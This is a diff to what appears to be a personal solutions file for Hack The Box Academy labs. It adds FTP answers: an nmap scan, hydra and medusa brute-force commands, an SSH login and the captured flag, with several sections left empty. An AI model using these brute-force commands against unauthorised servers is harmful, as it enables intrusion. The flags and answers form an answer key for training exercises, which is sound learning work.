@@ -2227,12 +2227,110 @@ User : htb-student
 
 ```
 
-
 Results: cf3a5525ee9414229e66279623ed5c58
 
 ## [Password Attacks](https://academy.hackthebox.com/module/details/147)
 
 ## [Attacking Common Services](https://academy.hackthebox.com/module/details/116)
+
+### FTP
+
+**What port is the FTP service running on?**
+
+```
+sudo nmap -sC -sV $ip -Pn -p-
+```
+
+Results: 2121
+
+**What username is available for the FTP server?**
+
+```
+# Footprint the service and check out that anonymous user is enabled. Login into the ftp service and download the userlist and password list. After that...
+
+# Two ways:
+medusa -U users.list  -P pws.list -h $ip  -M ftp -n 2121
+hydra -L users.list  -P pws.list ftp://$ip:2121 
+```
+
+Results:  robin
+
+**Use the discovered username with its password to login via SSH and obtain the flag.txt file. Submit the contents as your answer.**
+
+```
+ssh robin@$ip
+cat flag.txt
+```
+
+Results: HTB{ATT4CK1NG_F7P_53RV1C3}
+
+
+### SMB
+
+Question.
+
+```
+
+```
+
+Results: 
+
+### SQL Databases
+
+Question.
+
+```
+
+```
+
+Results: 
+
+
+### RDP
+
+Question.
+
+```
+
+```
+
+Results: 
+
+### DNS
+
+Question.
+
+```
+
+```
+
+Results: 
+
+
+### SMTP
+
+Question.
+
+```
+
+```
+
+Results: 
+
+
+### Skills Assessment
+
+Question.
+
+```
+
+```
+
+Results: 
+
+
+
+
 
 ## [Pivoting, Tunneling, and Port Forwarding](https://academy.hackthebox.com/module/details/158)
 
